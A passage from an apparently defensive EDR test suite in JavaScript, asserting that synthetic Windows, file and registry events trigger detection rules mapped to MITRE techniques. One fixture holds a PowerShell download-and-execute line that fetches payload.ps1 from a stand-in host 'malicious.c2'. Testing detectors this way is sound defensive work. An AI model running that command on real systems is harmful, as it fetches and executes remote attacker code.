  assert(acctAlert?.mitre_technique_id === 'T1136', 'Account creation alert mapped to MITRE T1136');

  // 3. Windows Event: Failed Remote Logon (4625)
  const failedLogonDetection = ingestAndDetect({
    channel: 'Security',
    windows_event_id: 4625,
    event_type: 'logon_failure',
    event_category: 'windows_event',
    user_name: 'Administrator',
    source_ip: '198.51.100.99'
  });
  const failedAlert = failedLogonDetection.alertsGenerated.find(a => a.rule_id === 'EDR-018-WIN-FAILED-LOGON-SPRAY');
  assert(failedAlert !== undefined, 'Detection Engine processes Windows Events: Failed Logon (4625 -> EDR-018)');
  assert(failedAlert?.mitre_technique_id === 'T1110', 'Failed logon alert mapped to MITRE T1110');

  // 4. Windows Event: Special Administrative Privileges Assigned (4672)
  const privDetection = ingestAndDetect({
    channel: 'Security',
    windows_event_id: 4672,
    event_type: 'privilege_assigned',
    event_category: 'windows_event',
    user_name: 'ElevatedUser',
    privilege_list: ['SeDebugPrivilege']
  });
  const privAlert = privDetection.alertsGenerated.find(a => a.rule_id === 'EDR-019-WIN-SPECIAL-PRIVILEGES-ASSIGNED');
  assert(privAlert !== undefined, 'Detection Engine processes Windows Events: Special Privileges (4672 -> EDR-019)');

  // 5. Windows Event: SCM Service Installation (7045)
  const svcDetection = ingestAndDetect({
    channel: 'System',
    windows_event_id: 7045,
    event_type: 'service_created',
    event_category: 'windows_event',
    service_name: 'BackdoorSvc',
    service_file_name: 'C:\\Users\\Public\\backdoor.exe'
  });
  const svcAlert = svcDetection.alertsGenerated.find(a => a.rule_id === 'EDR-020-WIN-SERVICE-INSTALLED-SCM');
  assert(svcAlert !== undefined, 'Detection Engine processes Windows Events: Service Creation (7045 -> EDR-020)');
  assert(svcAlert?.mitre_technique_id === 'T1543', 'Service installation alert mapped to MITRE T1543');

  // 6. Windows Event: Task Scheduler Registration (106)
  const taskDetection = ingestAndDetect({
    channel: 'Task Scheduler',
    windows_event_id: 106,
    event_type: 'scheduled_task_created',
    event_category: 'windows_event',
    task_name: '\\Microsoft\\Windows\\UpdateTask'
  });
  const taskAlert = taskDetection.alertsGenerated.find(a => a.rule_id === 'EDR-021-WIN-SCHEDULED-TASK-REGISTERED');
  assert(taskAlert !== undefined, 'Detection Engine processes Windows Events: Scheduled Task (106 -> EDR-021)');

  // 7. Windows Event: PowerShell ScriptBlock Logging (4104)
  const psDetection = ingestAndDetect({
    channel: 'PowerShell',
    windows_event_id: 4104,
    event_type: 'powershell_script_block',
    event_category: 'windows_event',
    script_text: 'IEX (New-Object Net.WebClient).DownloadString("http://malicious.c2/payload.ps1")'
  });
  const psAlert = psDetection.alertsGenerated.find(a => a.rule_id === 'EDR-022-WIN-POWERSHELL-SCRIPTBLOCK');
  assert(psAlert !== undefined, 'Detection Engine processes Windows Events: PowerShell ScriptBlock (4104 -> EDR-022)');
  assert(psAlert?.mitre_technique_id === 'T1059.001', 'PowerShell ScriptBlock mapped to MITRE T1059.001');

  // 8. Windows Event: Defender Real-time Protection Disabled (5001)
  const defDetection = ingestAndDetect({
    channel: 'Windows Defender',
    windows_event_id: 5001,
    event_type: 'defender_protection_disabled',
    event_category: 'windows_event'
  });
  const defAlert = defDetection.alertsGenerated.find(a => a.rule_id === 'EDR-023-WIN-DEFENDER-PROTECTION-DISABLED');
  assert(defAlert !== undefined, 'Detection Engine processes Windows Events: Defender Disabled (5001 -> EDR-023)');

  // 9. File Event: Startup folder drop (EDR-024)
  const fileDetection = ingestAndDetect({
    event_category: 'file',
    event_type: 'file_modification',
    file_path: 'C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\dropper.exe'
  });
  const fileAlert = fileDetection.alertsGenerated.find(a => a.rule_id === 'EDR-024-FILE-STARTUP-DROP');
  assert(fileAlert !== undefined, 'Detection Engine processes File Events (EDR-024)');

  // 10. Registry Event: Run key modified (EDR-025)
  const regDetection = ingestAndDetect({
    event_category: 'registry',
    event_type: 'registry_event',
    registry_key: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
  });
  const regAlert = regDetection.alertsGenerated.find(a => a.rule_id === 'EDR-025-REGISTRY-PERSISTENCE-KEY');
  assert(regAlert !== undefined, 'Detection Engine processes Registry Events (EDR-025)');

  // Run Specialized PowerShell & Windows LOLBin Detection Test Suite
  const { runLolbinTests } = await import('./lolbin-detection.test.js');
  const lolbinResults = await runLolbinTests();
  passed += lolbinResults.passed;
  failed += lolbinResults.failed;

  // Run Lightweight Network Telemetry & Sockets Test Suite
  const { runNetworkTelemetryTests } = await import('./network-telemetry.test.js');
  const networkResults = await runNetworkTelemetryTests();
  passed += networkResults.passed;
  failed += networkResults.failed;

  console.log(`\n\x1b[1m=== Master Test Results: ${passed} passed, ${failed} failed ===\x1b[0m\n`);

  if (failed > 0) {
    process.exit(1);
  }
}

runTests().catch(err => {
  console.error('Test runner encountered fatal error:', err);
  process.exit(1);
});
